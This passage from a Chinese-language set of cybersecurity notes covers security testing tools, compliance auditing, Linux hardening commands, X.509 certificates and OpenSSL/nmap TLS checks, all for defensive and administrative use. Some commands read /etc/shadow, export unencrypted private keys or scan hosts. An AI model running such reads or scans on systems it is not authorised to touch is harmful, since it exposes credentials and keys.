    response.headers['X-Content-Type-Options'] = 'nosniff'
    response.headers['X-Frame-Options'] = 'DENY'
    response.headers['Content-Security-Policy'] = "default-src 'self'"
    return response
```

## 4. 安全测试

### 4.1 SAST

静态应用安全测试，扫描源代码：

| 工具      | 语言   |
| --------- | ------ |
| Semgrep   | 多语言 |
| SonarQube | 多语言 |
| CodeQL    | 多语言 |
| Bandit    | Python |
| Brakeman  | Ruby   |

### 4.2 DAST

动态应用安全测试，测试运行中的应用：

| 工具       | 特点      |
| ---------- | --------- |
| OWASP ZAP  | 开源      |
| Burp Suite | 专业      |
| Nikto      | Web服务器 |

### 4.3 SCA

软件成分分析，检查依赖漏洞：

| 工具                   | 说明       |
| ---------------------- | ---------- |
| Dependabot             | GitHub集成 |
| Snyk                   | 商业       |
| Trivy                  | 开源       |
| OWASP Dependency-Check | 开源       |

## 5. 安全代码审查

### 5.1 审查清单

| 类别 | 检查项             |
| ---- | ------------------ |
| 认证 | 密码存储、会话管理 |
| 授权 | 访问控制、权限检查 |
| 输入 | 验证、过滤、编码   |
| 输出 | 编码、CSP          |
| 加密 | 算法选择、密钥管理 |
| 日志 | 敏感信息脱敏       |
| 错误 | 不暴露堆栈信息     |

### 5.2 常见安全缺陷

| 缺陷           | CWE     | 严重度 |
| -------------- | ------- | ------ |
| SQL注入        | CWE-89  | 高     |
| XSS            | CWE-79  | 高     |
| 硬编码密码     | CWE-259 | 高     |
| 不安全反序列化 | CWE-502 | 高     |
| 路径遍历       | CWE-22  | 高     |
| 不安全随机数   | CWE-330 | 中     |



<!-- ============ 文档分隔线：033-cybersecurity/019-ComplianceAudit.md ============ -->


## 1. 合规体系

### 1.1 主要法规标准

| 标准     | 地区 | 范围     |
| -------- | ---- | -------- |
| 等保2.0  | 中国 | 信息系统 |
| GDPR     | 欧盟 | 个人数据 |
| ISO27001 | 全球 | 信息安全 |
| SOC2     | 美国 | 服务组织 |
| PCI DSS  | 全球 | 支付卡   |
| HIPAA    | 美国 | 医疗     |

### 1.2 合规管理流程

```
识别适用法规 → 差距分析 → 制定合规计划 → 实施控制 → 持续监控 → 审计评估
```

## 2. 等保2.0

### 2.1 定级流程

```
确定定级对象 → 初步确定等级 → 专家评审 → 主管部门审核 → 公安备案
```

### 2.2 三级等保要求

| 类别     | 要求                     |
| -------- | ------------------------ |
| 物理安全 | 机房门禁、监控、消防     |
| 网络安全 | 边界防护、入侵检测       |
| 主机安全 | 身份鉴别、审计、入侵防范 |
| 应用安全 | 访问控制、通信完整性     |
| 数据安全 | 数据完整性、保密性、备份 |
| 管理安全 | 制度、人员、运维         |

## 3. GDPR

### 3.1 核心原则

- 合法性、公平性、透明性
- 目的限制
- 数据最小化
- 准确性
- 存储限制
- 完整性和保密性
- 问责制

### 3.2 数据主体权利

| 权利       | 说明             |
| ---------- | ---------------- |
| 访问权     | 获取个人数据副本 |
| 更正权     | 修正不准确数据   |
| 删除权     | 被遗忘权         |
| 限制处理权 | 限制数据处理     |
| 数据可携权 | 转移数据         |
| 反对权     | 反对数据处理     |

### 3.3 违规处罚

- 一般违规：1000万欧元或全球营业额2%
- 严重违规：2000万欧元或全球营业额4%

## 4. 安全审计

### 4.1 审计类型

| 类型     | 审计者   | 频率      |
| -------- | -------- | --------- |
| 内部审计 | 内部团队 | 季度/半年 |
| 外部审计 | 第三方   | 年度      |
| 合规审计 | 监管机构 | 按要求    |

### 4.2 审计范围

- 访问控制审计
- 变更管理审计
- 日志审计
- 漏洞管理审计
- 备份恢复审计
- 人员安全审计

### 4.3 审计证据

| 类型     | 示例               |
| -------- | ------------------ |
| 文档证据 | 策略文档、流程文件 |
| 技术证据 | 配置截图、日志记录 |
| 访谈证据 | 人员访谈记录       |
| 观察证据 | 现场观察记录       |

## 5. 合规自动化

### 5.1 自动化工具

| 工具         | 用途         |
| ------------ | ------------ |
| AWS Config   | 资源合规检查 |
| Azure Policy | 策略强制执行 |
| OPA          | 策略即代码   |
| InSpec       | 合规测试     |
| Prowler      | AWS安全检查  |

### 5.2 合规即代码

```yaml
# OPA 策略：禁止公开S3桶
package aws.s3

deny[msg] {
bucket := input.resource.aws_s3_bucket[name]
bucket.acl == "public-read"
msg := sprintf("S3 bucket '%s' is publicly readable", [name])
}
```

### 5.3 持续合规

```
代码提交 → 合规检查 → 部署 → 运行时监控 → 合规报告
```

- IaC扫描：部署前检查
- CSPM：运行时检查
- 持续报告：仪表盘展示
## 系统账户加固

**基本写法:检查空密码账户**
`awk -F: '($2 == "") {print $1}' /etc/shadow`
```bash
# 查找密码为空的用户账户
sudo awk -F: '($2 == "") {print $1}' /etc/shadow
```

**基本写法:锁定空密码账户**
`passwd -l <用户>`
```bash
# 锁定空密码账户
sudo passwd -l username
```

**基本写法:设置密码最长有效期**
`chage -M <天数> <用户>`
```bash
# 设置密码 90 天必须更换
sudo chage -M 90 username
```

**基本写法:查看密码策略**
`chage -l <用户>`
```bash
# 查看用户密码策略信息
chage -l root
```

**基本写法:设置密码最短长度**
`sed -i 's/PASS_MIN_LEN.*/PASS_MIN_LEN 12/' /etc/login.defs`
```bash
# 设置密码最小长度为 12 位
sudo sed -i 's/PASS_MIN_LEN.*/PASS_MIN_LEN 12/' /etc/login.defs
```

**基本写法:检查 UID 为 0 的用户**
`awk -F: '$3 == 0 {print $1}' /etc/passwd`
```bash
# 查找 UID 为 0 的用户(应只有 root)
awk -F: '$3 == 0 {print $1}' /etc/passwd
```

---

## SSH 服务加固

**基本写法:禁止 root 远程登录**
`sed -i 's/#PermitRootLogin.*/PermitRootLogin no/' /etc/ssh/sshd_config`
```bash
# 禁止 root 通过 SSH 登录
sudo sed -i 's/#PermitRootLogin.*/PermitRootLogin no/' /etc/ssh/sshd_config
```

**基本写法:禁用密码认证**
`sed -i 's/#PasswordAuthentication.*/PasswordAuthentication no/' /etc/ssh/sshd_config`
```bash
# 仅允许密钥认证
sudo sed -i 's/#PasswordAuthentication.*/PasswordAuthentication no/' /etc/ssh/sshd_config
```

**基本写法:修改默认端口**
`sed -i 's/#Port 22/Port 2222/' /etc/ssh/sshd_config`
```bash
# 修改 SSH 端口为 2222
sudo sed -i 's/#Port 22/Port 2222/' /etc/ssh/sshd_config
```

**基本写法:限制登录用户**
`echo "AllowUsers <用户>" >> /etc/ssh/sshd_config`
```bash
# 仅允许特定用户 SSH 登录
echo "AllowUsers admin deploy" | sudo tee -a /etc/ssh/sshd_config
```

**基本写法:重启 SSH 服务**
`systemctl restart sshd`
```bash
# 重启 SSH 服务应用配置
sudo systemctl restart sshd
```

---

## 文件权限加固

**基本写法:查找无主文件**
`find / -nouser -o -nogroup 2>/dev/null`
```bash
# 查找无属主或无属组的文件
sudo find / -nouser -o -nogroup 2>/dev/null
```

**基本写法:查找世界可写文件**
`find / -perm -0002 -type f -not -path "/proc/*" 2>/dev/null`
```bash
# 查找世界可写文件
sudo find / -perm -0002 -type f -not -path "/proc/*" 2>/dev/null
```

**基本写法:查找 SUID 文件**
`find / -perm -4000 -type f 2>/dev/null`
```bash
# 查找所有 SUID 文件
sudo find / -perm -4000 -type f 2>/dev/null
```

**基本写法:查找 SGID 文件**
`find / -perm -2000 -type f 2>/dev/null`
```bash
# 查找所有 SGID 文件
sudo find / -perm -2000 -type f 2>/dev/null
```

**基本写法:加固关键文件权限**
`chmod 644 /etc/passwd; chmod 600 /etc/shadow`
```bash
# 设置关键系统文件权限
sudo chmod 644 /etc/passwd
sudo chmod 640 /etc/shadow
sudo chmod 644 /etc/group
sudo chmod 600 /etc/gshadow
```

---

## 内核参数加固

**基本写法:启用 SYN Cookies**
`sysctl -w net.ipv4.tcp_syncookies=1`
```bash
# 启用 SYN Cookies 防 SYN Flood
sudo sysctl -w net.ipv4.tcp_syncookies=1
```

**基本写法:禁用 IP 转发**
`sysctl -w net.ipv4.ip_forward=0`
```bash
# 禁用 IP 转发(非路由器场景)
sudo sysctl -w net.ipv4.ip_forward=0
```

**基本写法:禁用源路由**
`sysctl -w net.ipv4.conf.all.accept_source_route=0`
```bash
# 禁用源路由数据包
sudo sysctl -w net.ipv4.conf.all.accept_source_route=0
sudo sysctl -w net.ipv4.conf.default.accept_source_route=0
```

**基本写法:启用反向路径过滤**
`sysctl -w net.ipv4.conf.all.rp_filter=1`
```bash
# 启用反向路径过滤防 IP 欺骗
sudo sysctl -w net.ipv4.conf.all.rp_filter=1
sudo sysctl -w net.ipv4.conf.default.rp_filter=1
```

**基本写法:永久保存配置**
`sysctl -p`
```bash
# 重新加载 sysctl 配置
sudo sysctl -p
```

---

## 服务最小化

**基本写法:列出启用服务**
`systemctl list-unit-files --state=enabled`
```bash
# 列出所有开机自启服务
systemctl list-unit-files --state=enabled
```

**基本写法:禁用不必要服务**
`systemctl disable <服务>`
```bash
# 禁用不需要的服务
sudo systemctl disable avahi-daemon
sudo systemctl disable cups
```

**基本写法:停止运行中服务**
`systemctl stop <服务>`
```bash
# 停止不必要的服务
sudo systemctl stop bluetooth
sudo systemctl stop modem-manager
```

**基本写法:查看监听端口**
`ss -tlnp`
```bash
# 查看所有监听端口与服务
sudo ss -tlnp
```

**基本写法:卸载不需要软件**
`apt-get purge <包名>`
```bash
# 卸载不需要的软件包
sudo apt-get purge rpcbind nfs-common
```

---

## 日志审计加固

**基本写法:启用审计服务**
`systemctl enable auditd`
```bash
# 启用 auditd 审计服务
sudo systemctl enable auditd
sudo systemctl start auditd
```

**基本写法:监控 passwd 文件**
`auditctl -w /etc/passwd -p wa -k passwd_change`
```bash
# 审计 passwd 文件变更
sudo auditctl -w /etc/passwd -p wa -k passwd_change
```

**基本写法:监控 sudo 使用**
`auditctl -w /var/log/sudo.log -p wa -k sudo_log`
```bash
# 审计 sudo 命令使用
sudo auditctl -w /var/log/sudo.log -p wa -k sudo_log
```

**基本写法:配置日志保留**
`sed -i 's/max_log_file.*/max_log_file = 50/' /etc/audit/auditd.conf`
```bash
# 配置审计日志保留大小
sudo sed -i 's/max_log_file.*/max_log_file = 50/' /etc/audit/auditd.conf
sudo sed -i 's/max_log_file_action.*/max_log_file_action = rotate/' /etc/audit/auditd.conf
```

**基本写法:启用远程日志**
`echo "*.* @<日志服务器>" >> /etc/rsyslog.conf`
```bash
# 配置远程日志服务器
echo "*.* @192.168.1.100" | sudo tee -a /etc/rsyslog.conf
sudo systemctl restart rsyslog
```

---

## 网络加固

**基本写法:配置防火墙默认策略**
`ufw default deny incoming`
```bash
# 默认拒绝所有入站流量
sudo ufw default deny incoming
sudo ufw default allow outgoing
```

**基本写法:限制 SSH 连接速率**
`iptables -A INPUT -p tcp --dport 22 -m state --state NEW -m recent --set`
```bash
# 限制 SSH 连接速率防爆破
sudo iptables -A INPUT -p tcp --dport 22 -m state --state NEW -m recent --set
sudo iptables -A INPUT -p tcp --dport 22 -m state --state NEW -m recent --update --seconds 60 --hitcount 4 -j DROP
```

**基本写法:禁用 ICMP 重定向**
`sysctl -w net.ipv4.conf.all.accept_redirects=0`
```bash
# 禁用 ICMP 重定向防中间人攻击
sudo sysctl -w net.ipv4.conf.all.accept_redirects=0
sudo sysctl -w net.ipv4.conf.default.accept_redirects=0
```

**基本写法:禁用 ICMP 广播**
`sysctl -w net.ipv4.icmp_echo_ignore_broadcasts=1`
```bash
# 禁用 ICMP 广播响应
sudo sysctl -w net.ipv4.icmp_echo_ignore_broadcasts=1
```

**基本写法:启用防火墙**
`ufw enable`
```bash
# 启用 ufw 防火墙
sudo ufw enable
sudo ufw allow 22/tcp
```

---

## 合规扫描工具

**基本写法:安装 Lynis**
`apt-get install lynis`
```bash
# 安装 Lynis 安全扫描工具
sudo apt-get install lynis
```

**基本写法:运行 Lynis 扫描**
`lynis audit system`
```bash
# 运行系统安全审计
sudo lynis audit system
```

**基本写法:输出扫描报告**
`lynis audit system --pentest`
```bash
# 以渗透测试视角运行扫描
sudo lynis audit system --pentest
```

**基本写法:查看扫描结果**
`cat /var/log/lynis.log | grep -E "Warning|Suggestion"`
```bash
# 查看 Lynis 扫描警告与建议
sudo cat /var/log/lynis.log | grep -E "Warning|Suggestion" | head -30
```

**基本写法:使用 OpenSCAP 扫描**
`oscap xccdf eval --profile <配置> <基准文件>`
```bash
# 使用 OpenSCAP 运行合规扫描
sudo oscap xccdf eval --profile xccdf_org.ssgproject.content_profile_pci_dss /usr/share/xml/scap/ssg/content/ssg-ubuntu2204-ds.xml
```

---

## CIS 基准检查

**基本写法:检查密码策略**
`cat /etc/pam.d/common-password`
```bash
# 查看 PAM 密码策略配置
cat /etc/pam.d/common-password
```

**基本写法:检查登录失败锁定**
`cat /etc/pam.d/common-auth | grep pam_tally`
```bash
# 检查是否配置账户锁定策略
grep -i "pam_tally\|pam_faillock" /etc/pam.d/common-auth
```

**基本写法:配置登录失败锁定**
`echo "auth required pam_tally2.so deny=5 unlock_time=600" >> /etc/pam.d/common-auth`
```bash
# 配置 5 次失败后锁定 10 分钟
echo "auth required pam_tally2.so deny=5 unlock_time=600" | sudo tee -a /etc/pam.d/common-auth
```

**基本写法:检查会话超时**
`cat /etc/profile | grep -i TMOUT`
```bash
# 检查是否配置会话超时
grep -i "TMOUT" /etc/profile
```

**基本写法:配置会话超时**
`echo "export TMOUT=600" >> /etc/profile`
```bash
# 配置 10 分钟无操作自动登出
echo "export TMOUT=600" | sudo tee -a /etc/profile
```

---

## 补丁管理

**基本写法:检查可用更新**
`apt-get update && apt list --upgradable`
```bash
# 列出所有可升级软件包
sudo apt-get update && apt list --upgradable
```

**基本写法:安装安全更新**
`apt-get upgrade`
```bash
# 安装所有可用更新
sudo apt-get upgrade -y
```

**基本写法:仅安装安全更新**
`unattended-upgrade --dry-run -v`
```bash
# 仅检查安全更新
sudo unattended-upgrade --dry-run -v
```

**基本写法:启用自动安全更新**
`dpkg-reconfigure -plow unattended-upgrades`
```bash
# 配置自动安装安全更新
sudo dpkg-reconfigure -plow unattended-upgrades
```

**基本写法:查看已安装补丁**
`apt list --installed | grep -i security`
```bash
# 查看已安装的安全更新
sudo apt list --installed | grep -i security
```

---

## 加固自检脚本

**基本写法:综合安全检查**
`#!/bin/bash ...`
```bash
# 综合安全检查脚本
echo "=== 用户检查 ==="
awk -F: '$3 == 0 {print "UID 0 用户:", $1}' /etc/passwd
echo "=== SSH 配置 ==="
grep -E "PermitRootLogin|PasswordAuthentication|Port" /etc/ssh/sshd_config
echo "=== 监听端口 ==="
sudo ss -tlnp
echo "=== SUID 文件 ==="
sudo find / -perm -4000 -type f 2>/dev/null
```

**基本写法:检查服务状态**
`systemctl list-unit-files --state=enabled | wc -l`
```bash
# 统计启用服务数量
systemctl list-unit-files --state=enabled | wc -l
```

**基本写法:验证防火墙状态**
`ufw status`
```bash
# 验证防火墙启用状态
sudo ufw status verbose
```

**基本写法:生成加固报告**
`lynis audit system > hardening_report.txt 2>&1`
```bash
# 生成系统加固报告
sudo lynis audit system > hardening_report.txt 2>&1
echo "加固评分: $(grep "Hardening index" /var/log/lynis-report.dat | cut -d= -f2)"
```

**基本写法:对比加固前后**
`diff <(cat /etc/ssh/sshd_config) <(cat sshd_config.backup)`
```bash
# 对比配置文件变更
diff /etc/ssh/sshd_config /backup/sshd_config.backup
```



<!-- ============ 文档分隔线：033-cybersecurity/020-DigitalCertificate.md ============ -->


## 1. 数字证书基础

### 1.1 什么是数字证书

数字证书是电子文档，用于证明公钥的所有权。由受信任的证书颁发机构（CA）签名。

### 1.2 核心组成

```
证书 = 公钥 + 身份信息 + 有效期 + CA 签名
```

### 1.3 信任模型

```
根 CA → 中间 CA → 终端证书
  ↑
信任锚
```

## 2. X.509 标准

### 2.1 证书结构

```
Certificate ::= SEQUENCE {
    tbsCertificate       TBSCertificate,
    signatureAlgorithm   AlgorithmIdentifier,
    signatureValue       BIT STRING
}

TBSCertificate ::= SEQUENCE {
    version              [0] EXPLICIT INTEGER DEFAULT v1,
    serialNumber         CertificateSerialNumber,
    signature            AlgorithmIdentifier,
    issuer               Name,
    validity             Validity,
    subject              Name,
    subjectPublicKeyInfo SubjectPublicKeyInfo,
    issuerUniqueID       [1] IMPLICIT UniqueIdentifier OPTIONAL,
    subjectUniqueID      [2] IMPLICIT UniqueIdentifier OPTIONAL,
    extensions           [3] EXPLICIT Extensions OPTIONAL
}
```

### 2.2 关键字段

| 字段          | 描述                |
| ------------- | ------------------- |
| Version       | v1(0)、v2(1)、v3(2) |
| Serial Number | CA 分配的唯一序列号 |
| Issuer        | 颁发者 DN           |
| Validity      | 起止时间            |
| Subject       | 主体 DN             |
| Public Key    | 公钥及算法          |
| Extensions    | 扩展信息            |

### 2.3 重要扩展

| 扩展                           | 描述              | 关键性 |
| ------------------------------ | ----------------- | ------ |
| Subject Alternative Name (SAN) | 证书覆盖的域名/IP | 关键   |
| Basic Constraints              | CA 标志和路径深度 | 关键   |
| Key Usage                      | 密钥用途          | 关键   |
| Extended Key Usage             | 扩展密钥用途      | 非关键 |
| Authority Key Identifier       | 颁发者密钥标识    | 非关键 |
| Subject Key Identifier         | 主体密钥标识      | 非关键 |
| CRL Distribution Points        | CRL 分发点        | 非关键 |
| Authority Information Access   | OCSP 地址         | 非关键 |

### 2.4 证书编码

| 格式    | 扩展名     | 描述                   |
| ------- | ---------- | ---------------------- |
| DER     | .der, .cer | 二进制编码             |
| PEM     | .pem, .crt | Base64 编码 + 头尾标记 |
| PKCS#7  | .p7b       | 证书链容器             |
| PKCS#12 | .p12, .pfx | 含私钥的容器           |

## 3. PKI 体系

### 3.1 PKI 组件

| 组件               | 功能           |
| ------------------ | -------------- |
| CA（证书颁发机构） | 签发和管理证书 |
| RA（注册机构）     | 身份验证       |
| 证书库             | 存储已颁发证书 |
| CRL/OCSP           | 证书状态查询   |
| 终端实体           | 证书使用者     |

### 3.2 证书生命周期

```
申请 → 验证 → 签发 → 部署 → 使用 → 续期/吊销 → 过期
```

### 3.3 证书类型

| 类型           | 验证级别         | 适用场景  |
| -------------- | ---------------- | --------- |
| DV（域名验证） | 仅验证域名控制权 | 个人网站  |
| OV（组织验证） | 验证组织身份     | 企业网站  |
| EV（扩展验证） | 严格身份验证     | 金融/电商 |

## 4. 证书链验证

### 4.1 验证流程

```
1. 检查证书签名是否由上级 CA 签发
2. 逐级验证直到根 CA
3. 检查每个证书的有效期
4. 检查证书是否被吊销（CRL/OCSP）
5. 检查 Key Usage 和 Extended Key Usage
6. 检查 SAN 是否匹配目标域名
```

### 4.2 证书链示例

```mermaid
flowchart TD
    T0["根 CA (DigiCert Global Root CA)"]
    T1["中间 CA (DigiCert SHA2 Secure Server CA)"]
    T2["终端证书 (example.com)"]
    T0 --> T1
    T1 --> T2
```

### 4.3 交叉签名

当根 CA 更换密钥时，使用新旧密钥同时签名中间 CA，确保过渡期兼容性。

## 5. 证书吊销

### 5.1 CRL（证书吊销列表）

```xml
<!-- CRL 结构 -->
CertificateList ::= SEQUENCE {
    tbsCertList          TBSCertList,
    signatureAlgorithm   AlgorithmIdentifier,
    signatureValue       BIT STRING
}
```

**缺点**：

- 需要定期下载完整列表
- 延迟高
- 列表可能很大

### 5.2 OCSP（在线证书状态协议）

```http
GET /ocsp?serial=123456 HTTP/1.1
Host: ocsp.example-ca.com
```

**响应**：

| 状态    | 含义       |
| ------- | ---------- |
| good    | 证书有效   |
| revoked | 证书已吊销 |
| unknown | 未知       |

### 5.3 OCSP Stapling

服务器主动获取并缓存 OCSP 响应，在 TLS 握手时发送给客户端。

**优势**：

- 减少客户端到 OCSP 服务器的请求
- 提高隐私性
- 减少延迟

## 6. 证书管理实践

### 6.1 OpenSSL 常用命令

```bash
# 生成私钥
openssl genrsa -out private.key 2048

# 生成 CSR
openssl req -new -key private.key -out request.csr

# 自签名证书
openssl req -x509 -key private.key -out cert.pem -days 365

# 查看证书信息
openssl x509 -in cert.pem -text -noout

# 验证证书链
openssl verify -CAfile ca.pem cert.pem

# 转换格式
openssl x509 -in cert.der -inform DER -out cert.pem -outform PEM
```

### 6.2 Let's Encrypt 自动化

```bash
# 使用 certbot 获取证书
certbot certonly --webroot -w /var/www/html -d example.com

# 自动续期
certbot renew --quiet
```

### 6.3 证书固定（Certificate Pinning）

```http
Public-Key-Pins: pin-sha256="base64=="; max-age=5184000
```

> 注意：HTTP Public Key Pinning (HPKP) 已被 Chrome 废弃，推荐使用 Certificate Transparency。

### 6.4 证书透明度（CT）

所有公开可信证书必须记录在 CT 日志中，可被公开审计。

```http
Expect-CT: enforce, max-age=86400, report-uri="https://example.com/ct-report"
```
## SSL/TLS 连接测试

**基本写法：测试 HTTPS 连接**
`openssl s_client -connect <主机>:<端口>`
```bash
# 测试 HTTPS 连接
openssl s_client -connect example.com:443
```

**基本写法：指定 SNI**
`openssl s_client -connect <主机>:<端口> -servername <域名>`
```bash
# 指定 SNI 测试虚拟主机
openssl s_client -connect example.com:443 -servername example.com
```

**基本写法：查看证书链**
`openssl s_client -showcerts -connect <主机>:<端口>`
```bash
# 查看完整证书链
openssl s_client -showcerts -connect example.com:443
```

**基本写法：静默模式测试**
`echo | openssl s_client -connect <主机>:443 2>/dev/null`
```bash
# 静默测试不阻塞
echo | openssl s_client -connect example.com:443 2>/dev/null
```

**基本写法：测试 SMTP TLS**
`openssl s_client -starttls smtp -connect <主机>:<端口>`
```bash
# 测试 SMTP 服务的 STARTTLS
openssl s_client -starttls smtp -connect smtp.example.com:587
```

---

## TLS 版本测试

**基本写法：测试 TLS 1.2**
`openssl s_client -tls1_2 -connect <主机>:<端口>`
```bash
# 测试服务器是否支持 TLS 1.2
openssl s_client -tls1_2 -connect example.com:443
```

**基本写法：测试 TLS 1.3**
`openssl s_client -tls1_3 -connect <主机>:<端口>`
```bash
# 测试服务器是否支持 TLS 1.3
openssl s_client -tls1_3 -connect example.com:443
```

**基本写法：禁用旧版本**
`openssl s_client -no_ssl3 -no_tls1 -no_tls1_1 -connect <主机>:<端口>`
```bash
# 禁用 SSL3、TLS1.0、TLS1.1
openssl s_client -no_ssl3 -no_tls1 -no_tls1_1 -connect example.com:443
```

**基本写法：查看协商的 TLS 版本**
`openssl s_client -connect <主机>:443 </dev/null 2>&1 | grep Protocol`
```bash
# 查看实际协商的 TLS 版本
openssl s_client -connect example.com:443 </dev/null 2>&1 | grep Protocol
```

---

## 密码套件测试

**基本写法：查看支持的密码套件**
`openssl ciphers -v`
```bash
# 列出所有支持的密码套件
openssl ciphers -v
```

**基本写法：测试特定密码套件**
`openssl s_client -cipher <密码套件> -connect <主机>:<端口>`
```bash
# 测试服务器是否支持特定密码套件
openssl s_client -cipher 'ECDHE-RSA-AES256-GCM-SHA384' -connect example.com:443
```

**基本写法：只使用强密码套件**
`openssl s_client -cipher 'HIGH:!aNULL:!MD5' -connect <主机>:<端口>`
```bash
# 只使用高强度密码套件
openssl s_client -cipher 'HIGH:!aNULL:!MD5:!RC4' -connect example.com:443
```

**基本写法：查看协商的密码套件**
`openssl s_client -connect <主机>:443 </dev/null 2>&1 | grep Cipher`
```bash
# 查看实际协商的密码套件
openssl s_client -connect example.com:443 </dev/null 2>&1 | grep Cipher
```

---

## 证书验证

**基本写法：验证证书链**
`openssl verify -CAfile <CA证书> <证书>`
```bash
# 验证证书是否有效
openssl verify -CAfile ca.crt server.crt
```

**基本写法：验证证书链含中间证书**
`openssl verify -CAfile <CA证书> -untrusted <中间证书> <证书>`
```bash
# 使用中间证书验证
openssl verify -CAfile root.crt -untrusted intermediate.crt server.crt
```

**基本写法：使用系统 CA 验证**
`openssl verify <证书>`
```bash
# 使用系统信任的 CA 验证证书
openssl verify server.crt
```

**基本写法：在线验证证书**
`openssl s_client -connect <主机>:443 -verify_return_error`
```bash
# 连接时验证证书有效性
openssl s_client -connect example.com:443 -verify_return_error
```

---

## 证书信息提取

**基本写法：查看证书过期时间**
`openssl x509 -enddate -noout -in <证书>`
```bash
# 查看证书过期日期
openssl x509 -enddate -noout -in cert.pem
```

**基本写法：从远程服务器获取过期时间**
`echo | openssl s_client -connect <主机>:443 2>/dev/null | openssl x509 -noout -enddate`
```bash
# 查看远程服务器证书过期时间
echo | openssl s_client -connect example.com:443 2>/dev/null | openssl x509 -noout -enddate
```

**基本写法：查看证书主题**
`openssl x509 -subject -noout -in <证书>`
```bash
# 查看证书主题
openssl x509 -subject -noout -in cert.pem
```

**基本写法：查看证书颁发者**
`openssl x509 -issuer -noout -in <证书>`
```bash
# 查看证书颁发者
openssl x509 -issuer -noout -in cert.pem
```

**基本写法：查看证书 SAN**
`openssl x509 -text -noout -in <证书> | grep -A1 "Subject Alternative Name"`
```bash
# 查看证书的 Subject Alternative Names
openssl x509 -text -noout -in cert.pem | grep -A1 "Subject Alternative Name"
```

---

## 证书匹配验证

**基本写法：验证证书和私钥匹配**
`openssl x509 -noout -modulus -in <证书> | openssl md5; openssl rsa -noout -modulus -in <私钥> | openssl md5`
```bash
# 对比证书和私钥的 modulus 是否一致
openssl x509 -noout -modulus -in cert.pem | openssl md5
openssl rsa -noout -modulus -in private.key | openssl md5
```

**基本写法：验证 CSR 和私钥匹配**
`openssl req -noout -modulus -in <CSR> | openssl md5; openssl rsa -noout -modulus -in <私钥> | openssl md5`
```bash
# 对比 CSR 和私钥的 modulus
openssl req -noout -modulus -in request.csr | openssl md5
openssl rsa -noout -modulus -in private.key | openssl md5
```

**基本写法：一键验证匹配**
`[ "$(openssl x509 -noout -modulus -in cert.pem | openssl md5)" = "$(openssl rsa -noout -modulus -in private.key | openssl md5)" ] && echo "匹配" || echo "不匹配"`
```bash
# 一键检查证书和私钥是否匹配
[ "$(openssl x509 -noout -modulus -in cert.pem | openssl md5)" = "$(openssl rsa -noout -modulus -in private.key | openssl md5)" ] && echo "匹配" || echo "不匹配"
```

---

## 证书下载与导出

**基本写法：下载服务器证书**
`echo | openssl s_client -connect <主机>:443 2>/dev/null | openssl x509 -out <文件>`
```bash
# 下载远程服务器证书
echo | openssl s_client -connect example.com:443 2>/dev/null | openssl x509 -out cert.pem
```

**基本写法：下载完整证书链**
`openssl s_client -showcerts -connect <主机>:443 </dev/null 2>/dev/null | openssl x509 -out <文件>`
```bash
# 下载完整证书链
openssl s_client -showcerts -connect example.com:443 </dev/null 2>/dev/null | awk '/-----BEGIN/,/-----END/{print}' > chain.pem
```

**基本写法：从 PFX 导出证书和私钥**
`openssl pkcs12 -in <PFX> -clcerts -nokeys -out <证书>; openssl pkcs12 -in <PFX> -nocerts -nodes -out <私钥>`
```bash
# 从 PFX 文件分别导出证书和私钥
openssl pkcs12 -in cert.pfx -clcerts -nokeys -out cert.pem
openssl pkcs12 -in cert.pfx -nocerts -nodes -out private.key
```

---

## 证书过期监控

**基本写法：检查证书剩余天数**
`openssl x509 -enddate -noout -in <证书> | cut -d= -f2`
```bash
# 查看证书过期日期
openssl x509 -enddate -noout -in cert.pem | cut -d= -f2
```

**基本写法：计算剩余天数**
```bash
`expiry=$(echo | openssl s_client -connect <主机>:443 2>/dev/null | openssl x509 -noout -enddate | cut -d= -f2)
days=$(( ( $(date -d "$expiry" +%s) - $(date +%s) ) / 86400 ))
echo "剩余 $days 天"`
```
```bash
# 计算远程证书剩余有效天数
expiry=$(echo | openssl s_client -connect example.com:443 2>/dev/null | openssl x509 -noout -enddate | cut -d= -f2)
days=$(( ( $(date -d "$expiry" +%s) - $(date +%s) ) / 86400 ))
echo "证书剩余 $days 天"
```

**基本写法：批量检查证书过期**
`for f in *.pem; do echo "$f: $(openssl x509 -enddate -noout -in $f | cut -d= -f2)"; done`
```bash
# 批量检查所有证书的过期时间
for f in *.pem; do echo "$f: $(openssl x509 -enddate -noout -in $f | cut -d= -f2)"; done
```

---

## 证书调试

**基本写法：查看证书完整信息**
`openssl x509 -text -noout -in <证书>`
```bash
# 查看证书完整详细信息
openssl x509 -text -noout -in cert.pem
```

**基本写法：查看证书序列号**
`openssl x509 -serial -noout -in <证书>`
```bash
# 查看证书序列号
openssl x509 -serial -noout -in cert.pem
```

**基本写法：查看证书指纹**
`openssl x509 -fingerprint -sha256 -noout -in <证书>`
```bash
# 查看 SHA256 指纹
openssl x509 -fingerprint -sha256 -noout -in cert.pem
```

**基本写法：查看公钥信息**
`openssl x509 -pubkey -noout -in <证书> | openssl rsa -pubin -text -noout`
```bash
# 查看证书中的公钥信息
openssl x509 -pubkey -noout -in cert.pem | openssl rsa -pubin -text -noout
```

---

## nmap SSL 扫描

**基本写法：枚举 SSL 密码套件**
`nmap --script ssl-enum-ciphers -p 443 <主机>`
```bash
# 使用 nmap 枚举 SSL 支持的密码套件
nmap --script ssl-enum-ciphers -p 443 example.com
```

**基本写法：检测 SSL 漏洞**
`nmap --script ssl-* -p 443 <主机>`
```bash
# 运行所有 SSL 相关脚本
nmap --script ssl-* -p 443 example.com
```

**基本写法：获取 SSL 证书**
`nmap --script ssl-cert -p 443 <主机>`
```bash
# 使用 nmap 获取 SSL 证书信息
nmap --script ssl-cert -p 443 example.com
```

---

## 证书吊销检查

**基本写法：检查 OCSP 状态**
`openssl ocsp -issuer <CA证书> -cert <证书> -url <OCSP URL> -no_nonce`
```bash
# 检查证书的 OCSP 吊销状态
openssl ocsp -issuer ca.crt -cert server.crt -url http://ocsp.example.com -no_nonce
```

**基本写法：从证书提取 OCSP URL**
`openssl x509 -text -noout -in <证书> | grep "OCSP"`
```bash
# 提取证书中的 OCSP URL
openssl x509 -text -noout -in cert.pem | grep "OCSP - URI"
```

**基本写法：检查 CRL**
`openssl crl -text -noout -in <CRL文件>`
```bash
# 查看证书吊销列表内容
openssl crl -text -noout -in crl.pem
```



<!-- ============ 文档分隔线：033-cybersecurity/021-HTTPSPrinciple.md ============ -->



## 1. HTTPS 概述

### 1.1 什么是 HTTPS

HTTPS = HTTP + TLS/SSL，在传输层对 HTTP 通信进行加密，提供：

| 安全属性 | 描述           |
| -------- | -------------- |
| 机密性   | 数据加密传输   |
